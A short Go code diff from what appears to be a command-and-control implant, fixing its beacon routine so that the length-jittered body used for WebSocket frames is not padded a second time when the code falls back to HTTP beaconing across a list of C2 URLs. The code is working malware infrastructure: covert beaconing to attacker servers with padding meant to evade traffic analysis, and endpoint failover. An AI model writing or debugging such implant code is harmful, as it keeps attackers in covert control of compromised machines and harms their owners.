@@ -26,6 +26,10 @@ var (
 func sendWSSBeacon(body []byte) []byte {
 	startIdx := int(currentC2Idx.Load())
 	urls := c2URLsSnapshot()
+	// Length jitter is a websocket-frame concern: sendToC2 applies it again
+	// on the HTTP fallback. Keep the unpadded envelope for that path, or the
+	// server strips only the outer prefix and rejects the inner one as JSON.
+	rawBody := body
 	body = padBeaconBody(body)
 	for i := 0; i < len(urls); i++ {
 		idx := (startIdx + i) % len(urls)
@@ -60,7 +64,7 @@ func sendWSSBeacon(body []byte) []byte {
 		return nil
 	}
 	fmt.Printf("[c2] WARN: all WebSocket endpoints failed, falling back to HTTP beacon (%d URL(s))\n", len(urls))
-	return sendBeacon(body)
+	return sendBeacon(rawBody)
 }
 
 func wssRoundTrip(wsURL string, body []byte) ([]byte, error) {
